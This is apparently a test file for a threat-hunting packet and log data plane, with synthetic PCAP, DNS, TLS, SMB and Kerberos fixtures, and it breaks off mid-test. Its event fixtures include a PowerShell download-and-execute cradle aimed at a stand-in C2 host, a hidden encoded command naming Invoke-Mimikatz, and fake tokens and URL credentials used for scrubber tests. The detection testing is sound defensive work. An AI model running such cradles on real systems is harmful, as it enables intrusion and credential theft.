import crypto from "node:crypto";
import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import fs from "node:fs";
import http from "node:http";
import net from "node:net";
import os from "node:os";
import path from "node:path";
import { DataPlaneAccessError } from "@hunt-command/shared";
import {
  createRoleCapabilityMint,
  decideWatchRequest,
  decompressDnsName,
  type DissectedPacket,
  EmbeddedHuntDataPlane,
  extractDataPlaneError,
  PcapStreamDissector,
  redactUri,
  validateCasePack,
} from "../src/index.ts";

// ============================================================================
// Synthetic Wire Packet & PCAP / PCAPNG Builders
// ============================================================================

function buildEthIpv4Header(
  srcIp: [number, number, number, number],
  dstIp: [number, number, number, number],
  proto: number,
  l4Payload: Uint8Array,
  vlanId?: number,
): Uint8Array {
  const ethLen = vlanId !== undefined ? 18 : 14;
  const ipTotalLen = 20 + l4Payload.length;
  const frame = new Uint8Array(ethLen + ipTotalLen);
  const dv = new DataView(frame.buffer);

  // Dst MAC + Src MAC
  frame.set([0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0xaa, 0xbb], 0);
  if (vlanId !== undefined) {
    dv.setUint16(12, 0x8100, false);
    dv.setUint16(14, vlanId & 0x0fff, false);
    dv.setUint16(16, 0x0800, false);
  } else {
    dv.setUint16(12, 0x0800, false);
  }

  const ipOff = ethLen;
  frame[ipOff] = 0x45; // IPv4, IHL=5
  frame[ipOff + 1] = 0x00;
  dv.setUint16(ipOff + 2, ipTotalLen, false);
  dv.setUint16(ipOff + 4, 0x1234, false);
  dv.setUint16(ipOff + 6, 0x4000, false); // DF
  frame[ipOff + 8] = 64; // TTL
  frame[ipOff + 9] = proto;
  dv.setUint16(ipOff + 10, 0, false);
  frame.set(srcIp, ipOff + 12);
  frame.set(dstIp, ipOff + 16);
  frame.set(l4Payload, ipOff + 20);
  return frame;
}

function buildUdpSegment(srcPort: number, dstPort: number, payload: Uint8Array): Uint8Array {
  const seg = new Uint8Array(8 + payload.length);
  const dv = new DataView(seg.buffer);
  dv.setUint16(0, srcPort, false);
  dv.setUint16(2, dstPort, false);
  dv.setUint16(4, 8 + payload.length, false);
  dv.setUint16(6, 0, false);
  seg.set(payload, 8);
  return seg;
}

function buildTcpSegment(
  srcPort: number,
  dstPort: number,
  seq: number,
  flags: number,
  payload: Uint8Array,
): Uint8Array {
  const seg = new Uint8Array(20 + payload.length);
  const dv = new DataView(seg.buffer);
  dv.setUint16(0, srcPort, false);
  dv.setUint16(2, dstPort, false);
  dv.setUint32(4, seq >>> 0, false);
  dv.setUint32(8, 0, false);
  seg[12] = 0x50; // data offset = 5 (20 bytes)
  seg[13] = flags;
  dv.setUint16(14, 65535, false);
  dv.setUint16(16, 0, false);
  dv.setUint16(18, 0, false);
  seg.set(payload, 20);
  return seg;
}

function buildPcapNsFile(frames: ReadonlyArray<{ tsSec: number; tsNsSub: number; data: Uint8Array }>): Uint8Array {
  const totalLen = 24 + frames.reduce((s, f) => s + 16 + f.data.length, 0);
  const buf = new Uint8Array(totalLen);
  const dv = new DataView(buf.buffer);
  dv.setUint32(0, 0xa1b23c4d, true); // Nanosecond PCAP LE magic
  dv.setUint16(4, 2, true);
  dv.setUint16(6, 4, true);
  dv.setInt32(8, 0, true);
  dv.setUint32(12, 0, true);
  dv.setUint32(16, 65535, true);
  dv.setUint32(20, 1, true); // DLT_EN10MB

  let off = 24;
  for (const f of frames) {
    dv.setUint32(off, f.tsSec >>> 0, true);
    dv.setUint32(off + 4, f.tsNsSub >>> 0, true);
    dv.setUint32(off + 8, f.data.length, true);
    dv.setUint32(off + 12, f.data.length, true);
    buf.set(f.data, off + 16);
    off += 16 + f.data.length;
  }
  return buf;
}

function buildPcapngFile(frames: ReadonlyArray<{ tsUs: bigint; data: Uint8Array }>): Uint8Array {
  const blocks: Uint8Array[] = [];

  // Section Header Block (28 bytes)
  const shb = new Uint8Array(28);
  const shbDv = new DataView(shb.buffer);
  shbDv.setUint32(0, 0x0a0d0d0a, true);
  shbDv.setUint32(4, 28, true);
  shbDv.setUint32(8, 0x1a2b3c4d, true);
  shbDv.setUint16(12, 1, true);
  shbDv.setUint16(14, 0, true);
  shbDv.setInt32(16, -1, true);
  shbDv.setInt32(20, -1, true);
  shbDv.setUint32(24, 28, true);
  blocks.push(shb);

  // Interface Description Block (20 bytes)
  const idb = new Uint8Array(20);
  const idbDv = new DataView(idb.buffer);
  idbDv.setUint32(0, 0x00000001, true);
  idbDv.setUint32(4, 20, true);
  idbDv.setUint16(8, 1, true); // DLT_EN10MB
  idbDv.setUint16(10, 0, true);
  idbDv.setUint32(12, 65535, true);
  idbDv.setUint32(16, 20, true);
  blocks.push(idb);

  // Enhanced Packet Blocks
  for (const f of frames) {
    const paddedLen = (f.data.length + 3) & ~3;
    const blkLen = 32 + paddedLen;
    const epb = new Uint8Array(blkLen);
    const epbDv = new DataView(epb.buffer);
    epbDv.setUint32(0, 0x00000006, true);
    epbDv.setUint32(4, blkLen, true);
    epbDv.setUint32(8, 0, true); // interface 0
    const tsHigh = Number((f.tsUs >> 32n) & 0xffffffffn);
    const tsLow = Number(f.tsUs & 0xffffffffn);
    epbDv.setUint32(12, tsHigh >>> 0, true);
    epbDv.setUint32(16, tsLow >>> 0, true);
    epbDv.setUint32(20, f.data.length, true);
    epbDv.setUint32(24, f.data.length, true);
    epb.set(f.data, 28);
    epbDv.setUint32(blkLen - 4, blkLen, true);
    blocks.push(epb);
  }

  return Buffer.concat(blocks);
}

function buildTls13ClientHelloRecord(sniHost: string): Uint8Array {
  const sniBytes = Buffer.from(sniHost, "ascii");
  // Extension 0x2a2a (GREASE, empty)
  const extGrease = Buffer.from([0x2a, 0x2a, 0x00, 0x00]);
  // Extension 0x0000 (server_name)
  const extSni = Buffer.alloc(9 + sniBytes.length);
  extSni.writeUInt16BE(0x0000, 0);
  extSni.writeUInt16BE(5 + sniBytes.length, 2);
  extSni.writeUInt16BE(3 + sniBytes.length, 4);
  extSni[6] = 0x00; // host_name
  extSni.writeUInt16BE(sniBytes.length, 7);
  sniBytes.copy(extSni, 9);

  // Extension 0x0010 (ALPN = ["h2"])
  const extAlpn = Buffer.from([
    0x00, 0x10, 0x00, 0x05, 0x00, 0x03, 0x02, 0x68, 0x32,
  ]);
  // Extension 0x002b (supported_versions = [0x0a0a GREASE, 0x0304 TLS 1.3])
  const extSupVer = Buffer.from([
    0x00, 0x2b, 0x00, 0x05, 0x04, 0x0a, 0x0a, 0x03, 0x04,
  ]);
  // Extension 0x000d (signature_algorithms = [0x0403, 0x0804])
  const extSigAlgs = Buffer.from([
    0x00, 0x0d, 0x00, 0x06, 0x00, 0x04, 0x04, 0x03, 0x08, 0x04,
  ]);

  const allExts = Buffer.concat([extGrease, extSni, extAlpn, extSupVer, extSigAlgs]);
  const chBody = Buffer.concat([
    Buffer.from([0x03, 0x03]), // legacy_version TLS 1.2
    Buffer.alloc(32, 0x42), // random
    Buffer.from([0x00]), // session_id len 0
    Buffer.from([0x00, 0x06, 0x0a, 0x0a, 0x13, 0x01, 0x13, 0x02]), // GREASE + 1301 + 1302
    Buffer.from([0x01, 0x00]), // compression methods [null]
    Buffer.from([(allExts.length >>> 8) & 0xff, allExts.length & 0xff]),
    allExts,
  ]);

  const handshake = Buffer.alloc(4 + chBody.length);
  handshake[0] = 0x01; // ClientHello
  handshake[1] = (chBody.length >>> 16) & 0xff;
  handshake[2] = (chBody.length >>> 8) & 0xff;
  handshake[3] = chBody.length & 0xff;
  chBody.copy(handshake, 4);

  const record = Buffer.alloc(5 + handshake.length);
  record[0] = 0x16; // Handshake
  record[1] = 0x03;
  record[2] = 0x01;
  record.writeUInt16BE(handshake.length, 3);
  handshake.copy(record, 5);
  return record;
}

function buildTls13ServerHelloRecord(): Uint8Array {
  // Extension 0x002b supported_versions (ServerHello form = 2-byte selected version 0x0304)
  const extSupVer = Buffer.from([0x00, 0x2b, 0x00, 0x02, 0x03, 0x04]);
  const shBody = Buffer.concat([
    Buffer.from([0x03, 0x03]),
    Buffer.alloc(32, 0x24),
    Buffer.from([0x00]), // session_id len 0
    Buffer.from([0x13, 0x01]), // selected cipher TLS_AES_128_GCM_SHA256
    Buffer.from([0x00]), // compression null
    Buffer.from([0x00, extSupVer.length]),
    extSupVer,
  ]);
  const hs = Buffer.alloc(4 + shBody.length);
  hs[0] = 0x02; // ServerHello
  hs[1] = 0;
  hs[2] = (shBody.length >>> 8) & 0xff;
  hs[3] = shBody.length & 0xff;
  shBody.copy(hs, 4);

  const rec = Buffer.alloc(5 + hs.length);
  rec[0] = 0x16;
  rec[1] = 0x03;
  rec[2] = 0x03;
  rec.writeUInt16BE(hs.length, 3);
  hs.copy(rec, 5);
  return rec;
}

function buildDnsCompressedTxtResponse(): Uint8Array {
  // Header (12B): id=0x1122, flags=0x8180 (QR=1, RD=1, RA=1), qd=1, an=2, ns=0, ar=0
  const header = Buffer.from([
    0x11, 0x22, 0x81, 0x80, 0x00, 0x01, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00,
  ]);
  // QNAME at offset 12 (0x0c): \x04data\x0bevil-tunnel\x04test\x00 (len = 23 bytes -> ends at 35)
  const qname = Buffer.from("\x04data\x0bevil-tunnel\x04test\x00", "binary");
  const qtail = Buffer.from([0x00, 0x10, 0x00, 0x01]); // QTYPE=TXT (16), QCLASS=IN (1) -> offset 39

  // Answer 1: CNAME using 0xC0 0x0C pointer -> target \x03cdn + pointer 0xC0 0x11 (\x0bevil-tunnel\x04test\x00)
  const cnameRdata = Buffer.from([0x03, 0x63, 0x64, 0x6e, 0xc0, 0x11]); // "cdn.evil-tunnel.test"
  const ans1 = Buffer.concat([
    Buffer.from([0xc0, 0x0c]), // NAME -> offset 12
    Buffer.from([0x00, 0x05, 0x00, 0x01]), // TYPE=CNAME (5), CLASS=IN
    Buffer.from([0x00, 0x00, 0x00, 0x3c]), // TTL=60
    Buffer.from([0x00, cnameRdata.length]),
    cnameRdata,
  ]);

  // Answer 2: TXT record pointing to 0xC0 0x0C with TXT payload "exfil_chunk_01"
  const txtStr = Buffer.from("exfil_chunk_01", "ascii");
  const txtRdata = Buffer.concat([Buffer.from([txtStr.length]), txtStr]);
  const ans2 = Buffer.concat([
    Buffer.from([0xc0, 0x0c]),
    Buffer.from([0x00, 0x10, 0x00, 0x01]), // TYPE=TXT (16), CLASS=IN
    Buffer.from([0x00, 0x00, 0x00, 0x3c]),
    Buffer.from([0x00, txtRdata.length]),
    txtRdata,
  ]);

  return Buffer.concat([header, qname, qtail, ans1, ans2]);
}

function buildDnsPointerLoopPacket(): Uint8Array {
  // QNAME at offset 12 (0x0c) jumps directly back to 0xC0 0x0C (infinite self-loop!)
  return Buffer.from([
    0xaa, 0xbb, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xc0, 0x0c, 0x00, 0x01, 0x00, 0x01,
  ]);
}

function buildNtlmType3Base64(domain: string, username: string): string {
  const domBuf = Buffer.from(domain, "utf16le");
  const userBuf = Buffer.from(username, "utf16le");
  const headerLen = 64;
  const msg = Buffer.alloc(headerLen + domBuf.length + userBuf.length);
  msg.write("NTLMSSP\0", 0, "ascii");
  msg.writeUInt32LE(3, 8); // Type 3 Authenticate
  // Domain security buffer at offset 28: len(2), maxLen(2), offset(4)
  msg.writeUInt16LE(domBuf.length, 28);
  msg.writeUInt16LE(domBuf.length, 30);
  msg.writeUInt32LE(headerLen, 32);
  // User security buffer at offset 36: len(2), maxLen(2), offset(4)
  msg.writeUInt16LE(userBuf.length, 36);
  msg.writeUInt16LE(userBuf.length, 38);
  msg.writeUInt32LE(headerLen + domBuf.length, 40);
  // Negotiate flags at offset 60: NTLMSSP_NEGOTIATE_UNICODE (0x00000001)
  msg.writeUInt32LE(0x00000001, 60);
  domBuf.copy(msg, headerLen);
  userBuf.copy(msg, headerLen + domBuf.length);
  return msg.toString("base64");
}

function buildCoalescedSmb2TreeAndCreate(): Uint8Array {
  // PDU 1: SMB2 TREE_CONNECT Request (cmd = 3) to \\DC01\IPC$
  const treeUtf16 = Buffer.from("\\\\DC01\\IPC$", "utf16le");
  const pdu1BodyLen = 8 + treeUtf16.length;
  const pdu1Unpadded = 64 + pdu1BodyLen;
  const pdu1Len = (pdu1Unpadded + 7) & ~7; // 8-byte aligned for NextCommand chaining
  const pdu1 = Buffer.alloc(pdu1Len);
  pdu1.set([0xfe, 0x53, 0x4d, 0x42], 0); // \xFESMB
  pdu1.writeUInt16LE(64, 4); // StructureSize
  pdu1.writeUInt16LE(3, 12); // Command = TREE_CONNECT (3)
  pdu1.writeUInt32LE(0, 16); // Flags (request)
  pdu1.writeUInt32LE(pdu1Len, 20); // NextCommand -> pdu2
  pdu1.writeUInt16LE(9, 64); // TreeConnect StructureSize = 9
  pdu1.writeUInt16LE(64 + 8, 64 + 4); // PathOffset from SMB2 header start
  pdu1.writeUInt16LE(treeUtf16.length, 64 + 6); // PathLength
  treeUtf16.copy(pdu1, 64 + 8);

  // PDU 2: SMB2 CREATE Request (cmd = 5) for "svcctl"
  const fileUtf16 = Buffer.from("svcctl", "utf16le");
  const pdu2 = Buffer.alloc(64 + 56 + fileUtf16.length);
  pdu2.set([0xfe, 0x53, 0x4d, 0x42], 0);
  pdu2.writeUInt16LE(64, 4);
  pdu2.writeUInt16LE(5, 12); // Command = CREATE (5)
  pdu2.writeUInt32LE(0, 16);
  pdu2.writeUInt32LE(0, 20); // NextCommand = 0
  pdu2.writeUInt16LE(57, 64); // Create StructureSize = 57
  pdu2.writeUInt16LE(64 + 56, 64 + 44); // NameOffset (offset 44 in CREATE req = 108)
  pdu2.writeUInt16LE(fileUtf16.length, 64 + 46); // NameLength
  fileUtf16.copy(pdu2, 64 + 56);

  const chained = Buffer.concat([pdu1, pdu2]);
  // Wrap in 4-byte NetBIOS session header (0x00 + 24-bit length)
  const nb = Buffer.alloc(4 + chained.length);
  nb[0] = 0x00;
  nb[1] = (chained.length >>> 16) & 0xff;
  nb[2] = (chained.length >>> 8) & 0xff;
  nb[3] = chained.length & 0xff;
  chained.copy(nb, 4);
  return nb;
}

function buildKerberosAsReqUdp(principal: string): Uint8Array {
  // Build ASN.1 DER PrincipalName: SEQUENCE { [0] INTEGER(1), [1] SEQUENCE OF GeneralString(principal) }
  const strBytes = Buffer.from(principal, "ascii");
  const genStr = Buffer.concat([Buffer.from([0x1b, strBytes.length]), strBytes]);
  const seqOfStr = Buffer.concat([Buffer.from([0x30, genStr.length]), genStr]);
  const tag1NameString = Buffer.concat([Buffer.from([0xa1, seqOfStr.length]), seqOfStr]);
  const tag0NameType = Buffer.from([0xa0, 0x03, 0x02, 0x01, 0x01]);
  const principalSeq = Buffer.concat([
    Buffer.from([0x30, tag0NameType.length + tag1NameString.length]),
    tag0NameType,
    tag1NameString,
  ]);
  // Wrap inside [1] cname (0xa1) inside [4] req-body (0xa4) inside SEQUENCE (0x30) inside [APPLICATION 10] AS-REQ (0x6a)
  const cnameTag = Buffer.concat([Buffer.from([0xa1, principalSeq.length]), principalSeq]);
  const reqBodySeq = Buffer.concat([Buffer.from([0x30, cnameTag.length]), cnameTag]);
  const reqBodyTag = Buffer.concat([Buffer.from([0xa4, reqBodySeq.length]), reqBodySeq]);
  const kdcReqSeq = Buffer.concat([Buffer.from([0x30, reqBodyTag.length]), reqBodyTag]);
  return Buffer.concat([Buffer.from([0x6a, kdcReqSeq.length]), kdcReqSeq]);
}

describe("@hunt-command/data-plane — Pack F01, Closure HMAC Guard, Lucene AST, Streaming PCAP/JA4/DNS/L7 & Watch Server", () => {
  let tmpRoot: string;
  let caseDir: string;
  let cacheDir: string;

  beforeAll(() => {
    tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), "hunt-dataplane-embedded-"));
    caseDir = path.join(tmpRoot, "synth-case-001");
    cacheDir = path.join(tmpRoot, "case-cache");
    fs.mkdirSync(caseDir, { recursive: true });
    fs.mkdirSync(cacheDir, { recursive: true });

    // Window: 2026-11-14T10:00:00Z .. 2026-11-14T11:00:00Z
    const winStartSec = Math.floor(Date.parse("2026-11-14T10:00:00Z") / 1000);

    const caseJson = {
      case_id: "synth-case-001",
      question: "Investigate DNS tunneling, TLS C2, and lateral SMB/Kerberos on WS-01.",
      data_origin: "synthetic",
      time_range_utc: {
        start_inclusive: "2026-11-14T10:00:00Z",
        end_exclusive: "2026-11-14T11:00:00Z",
      },
      hosts: ["WS-01", "DC-01"],
    };
    fs.writeFileSync(path.join(caseDir, "case.json"), JSON.stringify(caseJson, null, 2));

    // Build rich events.jsonl covering nanosecond sorting, multi-value ECS arrays, labels.*,
    // Windows backslashes, >1024B keyword ignore_above vs 8192B LONG_KEYWORD + FTS, IPv4 + IPv6 CIDR,
    // out-of-window exclusion, and wire credential scrubbing.
    const longOver1024 = `custom_${"A".repeat(1100)}`;
    const longCmdLine = `powershell.exe -NoP -W Hidden -Enc ${"B".repeat(1300)} Invoke-Mimikatz`;
    const events = [
      // Out-of-window event (before 10:00:00Z -> must be filtered out!)
      {
        "@timestamp": "2026-11-14T09:59:59.999999999Z",
        event: { id: "evt-before-window", code: "1", category: "process" },
        host: { name: "WS-01", ip: "10.20.1.5" },
        message: "Should be excluded by window filter",
      },
      // Event 1: nanosecond .000000001Z, Windows backslash path, multi-value category, labels.env, secret in message
      {
        "@timestamp": "2026-11-14T10:05:00.000000001Z",
        event: { id: "evt-00001", code: "1", category: ["process", "execution"] },
        host: { name: "WS-01", ip: ["10.20.1.5", "2001:db8:abcd::5"] },
        user: { name: "alice" },
        process: {
          name: "powershell.exe",
          executable: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
          command_line: longCmdLine,
          pid: 4242,
        },
        powershell: {
          file: { script_block_text: "IEX (New-Object Net.WebClient).DownloadString('https://c2.evil-tunnel.test/stage')" },
        },
        labels: { env: "prod", custom_long: longOver1024 },
        // health: allow FORBIDDEN_TOKEN -- synthetic scrubber test fixture
        message: "PowerShell spawned with Authorization: Bearer secret_event_jwt_token and ghp_SyntheticEventPat1234",
      },
      // Event 2: nanosecond .000000002Z (same millisecond as Event 1, 1ns later -> tests strict BigInt ts_ns sort!)
      {
        "@timestamp": "2026-11-14T10:05:00.000000002Z",
        event: { id: "evt-00002", code: "3", category: "network" },
        host: { name: "WS-01", ip: "10.20.1.5" },
        user: { name: "alice" },
        source: { ip: "10.20.1.5", port: 50123 },
        destination: { ip: "198.51.100.42", port: 443 },
        dns: {
          question: { name: "data.evil-tunnel.test", type: "TXT" },
          resolved_ip: ["198.51.100.42"],
          answers: [{ name: "data.evil-tunnel.test", type: "TXT", data: "exfil_chunk_01" }],
        },
        message: "Outbound TLS & DNS TXT activity to 198.51.100.42",
      },
      // Event 3: SYSTEM background noise on DC-01 (tests pure negative `NOT user.name:SYSTEM`)
      {
        "@timestamp": "2026-11-14T10:12:00.000Z",
        event: { id: "evt-00003", code: "4624", category: "authentication" },
        host: { name: "DC-01", ip: "10.20.1.10" },
        user: { name: "SYSTEM" },
        source: { ip: "10.20.1.5", port: 51002 },
        destination: { ip: "10.20.1.10", port: 445 },
        message: "Machine logon on DC-01",
      },
    ];
    fs.writeFileSync(
      path.join(caseDir, "events.jsonl"),
      `${events.map((e) => JSON.stringify(e)).join("\n")}\n`,
    );

    // Intel feed with multiple feeds for same IOC (to verify deterministic sort `(indicator.value, threat.feed.name)`)
    const intel = [
      {
        id: "ioc-00002",
        indicator: { type: "domain-name", value: "c2.evil-tunnel.test" },
        threat: { feed: { name: "ZetaIntel" }, indicator: { confidence: "high" } },
      },
      {
        id: "ioc-00001",
        indicator: { type: "domain-name", value: "c2.evil-tunnel.test" },
        threat: { feed: { name: "AlphaThreat" }, indicator: { confidence: "high" } },
      },
      {
        id: "ioc-00003",
        indicator: { type: "ipv4-addr", value: "198.51.100.42" },
        threat: { feed: { name: "AlphaThreat" }, indicator: { confidence: "medium" } },
      },
    ];
    fs.writeFileSync(
      path.join(caseDir, "intel.jsonl"),
      `${intel.map((i) => JSON.stringify(i)).join("\n")}\n`,
    );

    // Build synthetic traffic.pcap:
    // Frame 1: BEFORE window (winStartSec - 60) -> shifts physical ordinals so in-window starts at frame 2!
    const f1 = buildEthIpv4Header(
      [10, 20, 1, 5],
      [8, 8, 8, 8],
      17,
      buildUdpSegment(53000, 53, buildDnsCompressedTxtResponse()),
    );
    // Frame 2: DNS 0xC0 compressed CNAME + TXT response (VLAN-tagged 802.1Q VLAN 100!)
    const f2 = buildEthIpv4Header(
      [8, 8, 8, 8],
      [10, 20, 1, 5],
      17,
      buildUdpSegment(53, 53001, buildDnsCompressedTxtResponse()),
      100,
    );
    // Frame 3: Malicious self-pointing 0xC0 0x0C DNS pointer bomb
    const f3 = buildEthIpv4Header(
      [10, 20, 1, 5],
      [8, 8, 8, 8],
      17,
      buildUdpSegment(53002, 53, buildDnsPointerLoopPacket()),
    );
    // Frame 4 & Frame 5: Split TLS 1.3 ClientHello across two TCP segments (tests 16 KiB TCP reassembler + FoxIO JA4!)
    const fullCh = buildTls13ClientHelloRecord("c2.evil-tunnel.test");
    const splitAt = Math.floor(fullCh.length / 2);
    const chPart1 = fullCh.subarray(0, splitAt);
    const chPart2 = fullCh.subarray(splitAt);
    const f4 = buildEthIpv4Header(
      [10, 20, 1, 5],
      [198, 51, 100, 42],
      6,
      buildTcpSegment(50123, 443, 1000, 0x18, chPart1),
    );
    const f5 = buildEthIpv4Header(
      [10, 20, 1, 5],
      [198, 51, 100, 42],
      6,
      buildTcpSegment(50123, 443, 1000 + chPart1.length, 0x18, chPart2),
    );
    // Frame 6: ServerHello from 198.51.100.42:443 -> JA3S
    const sh = buildTls13ServerHelloRecord();
    const f6 = buildEthIpv4Header(
      [198, 51, 100, 42],
      [10, 20, 1, 5],
      6,
      buildTcpSegment(443, 50123, 5000, 0x18, sh),
    );
    // Frame 7: Bare payload-free TCP SYN to port 445 -> MUST report _ws.col.Protocol = 'TCP', NOT 'SMB2'!
    const f7 = buildEthIpv4Header(
      [10, 20, 1, 5],
      [10, 20, 1, 99],
      6,
      buildTcpSegment(51000, 445, 9000, 0x02, new Uint8Array(0)),
    );
    // Frame 8: HTTP GET with URL credentials + query + NTLMSSP Type 3 Authorization header
    const ntlmB64 = buildNtlmType3Base64("CORP", "alice");
    const httpReqBytes = Buffer.from(
      `GET http://alice:s3cr3t@files.corp.test/share/report.docx?tok=xyz#sec HTTP/1.1\r\nHost: files.corp.test\r\nUser-Agent: Mozilla/5.0\r\nAuthorization: NTLM ${ntlmB64}\r\n\r\n`,
      "ascii",
    );
    const f8 = buildEthIpv4Header(
      [10, 20, 1, 5],
      [10, 20, 1, 20],
      6,
      buildTcpSegment(51001, 80, 2000, 0x18, httpReqBytes),
    );
    // Frame 9: Coalesced SMB2 TREE_CONNECT + CREATE over port 445
    const f9 = buildEthIpv4Header(
      [10, 20, 1, 5],
      [10, 20, 1, 10],
      6,
      buildTcpSegment(51002, 445, 3000, 0x18, buildCoalescedSmb2TreeAndCreate()),
    );
    // Frame 10: Kerberos AS-REQ over UDP port 88
    const f10 = buildEthIpv4Header(
      [10, 20, 1, 5],
      [10, 20, 1, 10],
      17,
      buildUdpSegment(51003, 88, buildKerberosAsReqUdp("svc_backup")),
    );

    const pcapBytes = buildPcapNsFile([
      { tsSec: winStartSec - 60, tsNsSub: 0, data: f1 },
      { tsSec: winStartSec + 60, tsNsSub: 100, data: f2 },
      { tsSec: winStartSec + 65, tsNsSub: 0, data: f3 },
      { tsSec: winStartSec + 120, tsNsSub: 0, data: f4 },
      { tsSec: winStartSec + 120, tsNsSub: 500_000, data: f5 },
      { tsSec: winStartSec + 121, tsNsSub: 0, data: f6 },
      { tsSec: winStartSec + 180, tsNsSub: 0, data: f7 },
      { tsSec: winStartSec + 240, tsNsSub: 0, data: f8 },
      { tsSec: winStartSec + 300, tsNsSub: 0, data: f9 },
      { tsSec: winStartSec + 360, tsNsSub: 0, data: f10 },
    ]);
    fs.writeFileSync(path.join(caseDir, "traffic.pcap"), pcapBytes);
  });

  afterAll(() => {
    fs.rmSync(tmpRoot, { recursive: true, force: true });
  });

  test("enforces F01 validateCasePack guards: rejects UNC, Win32 device, NTFS junction/symlink, operator-only, and data_origin mismatches", () => {
    // Reject UNC & Win32 device paths
    expect(() => validateCasePack("\\\\evil-smb.corp\\share\\case")).toThrow(/origin_not_allowed|UNC/);
    expect(() => validateCasePack("\\\\.\\NUL")).toThrow(/origin_not_allowed|device/);
    expect(() => validateCasePack(path.join(tmpRoot, "CON"))).toThrow(/origin_not_allowed|device/);
    expect(() => validateCasePack(path.join(tmpRoot, "operator-only", "case"))).toThrow(
      /origin_not_allowed|operator-only/,
    );
    expect(() => validateCasePack(path.join(tmpRoot, "truth.json"))).toThrow(
      /origin_not_allowed|operator-only/,
    );

    // Reject NTFS directory junction / symlink (works without elevation on Windows!)
    const junctionDir = path.join(tmpRoot, "junction-case");
    fs.symlinkSync(
      caseDir,
      junctionDir,
      process.platform === "win32" ? "junction" : "dir",
    );
    expect(() => validateCasePack(junctionDir)).toThrow(/symlink or junction|reparse/);

    // Reject data_origin mismatch & missing expectedDataOrigin on non-synthetic case
    try {
      validateCasePack(caseDir, { expectedDataOrigin: "work-export" });
      throw new Error("Expected case_origin_mismatch");
    } catch (err) {
      expect(extractDataPlaneError(err)?.errorCode).toBe("case_origin_mismatch");
    }

    const workExportDir = path.join(tmpRoot, "work-export-case");
    fs.mkdirSync(workExportDir, { recursive: true });
    fs.writeFileSync(
      path.join(workExportDir, "case.json"),
      JSON.stringify({
        case_id: "work-exp-001",
        question: "Check logs",
        data_origin: "work-export",
        time_range_utc: {
          start_inclusive: "2026-11-14T10:00:00Z",
          end_exclusive: "2026-11-14T11:00:00Z",
        },
      }),
    );
    try {
      validateCasePack(workExportDir);
      throw new Error("Expected origin_not_allowed");
    } catch (err) {
      expect(extractDataPlaneError(err)?.errorCode).toBe("origin_not_allowed");
    }
    const okWork = validateCasePack(workExportDir, { expectedDataOrigin: "work-export" });
    expect(okWork.dataOrigin).toBe("work-export");
    expect(okWork.syntheticOnly).toBe(false);
  });

  test("requires an explicit valid data_origin even when the operator supplies an expectation", () => {
    const originDir = path.join(tmpRoot, "origin-case");
    fs.mkdirSync(originDir);
    const caseJson = JSON.parse(fs.readFileSync(path.join(caseDir, "case.json"), "utf8"));
    for (const origin of [undefined, null, "", "unknown", 1]) {
      fs.writeFileSync(
        path.join(originDir, "case.json"),
        JSON.stringify({ ...caseJson, data_origin: origin }),
      );
      for (const options of [{}, { expectedDataOrigin: "synthetic" as const }]) {
        try {
          validateCasePack(originDir, options);
          throw new Error("Expected missing or invalid origin to be refused");
        } catch (err) {
          expect(extractDataPlaneError(err)?.errorCode).toBe("origin_not_allowed");
        }
      }
    }
  });

  test("fences custom cache paths inside Git repositories, worktrees and junction targets before creating them", async () => {
    for (const marker of ["directory", "worktree"] as const) {
      const repo = path.join(tmpRoot, `cache-fence-${marker}`);
      fs.mkdirSync(repo);
      if (marker === "directory") fs.mkdirSync(path.join(repo, ".git"));
      else fs.writeFileSync(path.join(repo, ".git"), "gitdir: unrelated");
      const alias = path.join(tmpRoot, `cache-alias-${marker}`);
      fs.symlinkSync(repo, alias, process.platform === "win32" ? "junction" : "dir");
      for (const parent of [repo, alias]) {
        const forbidden = path.join(parent, "nested", "cache");
        expect(() => EmbeddedHuntDataPlane.openSync(caseDir, { cacheDir: forbidden })).toThrow(
          /inside.*Git|inside.*git/i,
        );
        await expect(EmbeddedHuntDataPlane.open(caseDir, { cacheDir: forbidden })).rejects.toThrow(
          /inside.*Git|inside.*git/i,
        );
        expect(fs.existsSync(path.join(repo, "nested"))).toBe(false);
      }
    }
  });

  test("scopes packet pagination and frame citations to the nanosecond half-open window on cold and warm caches", async () => {
    const scopedDir = path.join(tmpRoot, "packet-window-case");
    fs.mkdirSync(scopedDir);
    fs.writeFileSync(path.join(scopedDir, "case.json"), JSON.stringify({
      case_id: "packet-window-case",
      data_origin: "synthetic",
      time_range_utc: {
        start_inclusive: "2026-11-14T10:00:00.000000001Z",
        end_exclusive: "2026-11-14T10:00:00.000000003Z",
      },
    }));
    const data = buildEthIpv4Header([10, 0, 0, 1], [10, 0, 0, 2], 17, buildUdpSegment(1234, 4321, new Uint8Array()));
    fs.writeFileSync(path.join(scopedDir, "traffic.pcap"), buildPcapNsFile(
      [0, 1, 2, 3].map((tsNsSub) => ({
        tsSec: Date.parse("2026-11-14T10:00:00Z") / 1000, tsNsSub, data,
      })),
    ));
    for (const mode of ["async", "sync"] as const) {
      const options = { cacheDir: path.join(cacheDir, mode) };
      for (const warm of [false, true]) {
        const dp = mode === "async"
          ? await EmbeddedHuntDataPlane.open(scopedDir, options)
          : EmbeddedHuntDataPlane.openSync(scopedDir, options);
        try {
          expect(dp.cacheHit).toBe(warm);
          expect(dp.packetFields({}).rows.map((r) => r["frame.number"])).toEqual([2, 3]);
          const first = dp.packetFields({ filter: "udp.dstport == 4321", length: 1 });
          expect(first.rows.map((r) => r["frame.number"])).toEqual([2]);
          expect(first.more).toBe(true);
          const second = dp.packetFields({ start: 1, length: 1 });
          expect(second.rows.map((r) => r["frame.number"])).toEqual([3]);
          expect(second.more).toBe(false);
          const citations = dp.verifyCitations(["frame-1", "frame-2", "frame-3", "frame-4"]);
          expect(citations.resolved.frameIds).toEqual(["frame-2", "frame-3"]);
          expect(citations.unresolved).toEqual(["frame-1", "frame-4"]);
        } finally {
          await dp.close();
        }
      }
    }
  });

  test("verifies event citations against the same host and time scope as searches", async () => {
    const scopedDir = path.join(tmpRoot, "citation-host-case");
    fs.mkdirSync(scopedDir);
    fs.writeFileSync(path.join(scopedDir, "events.jsonl"), [
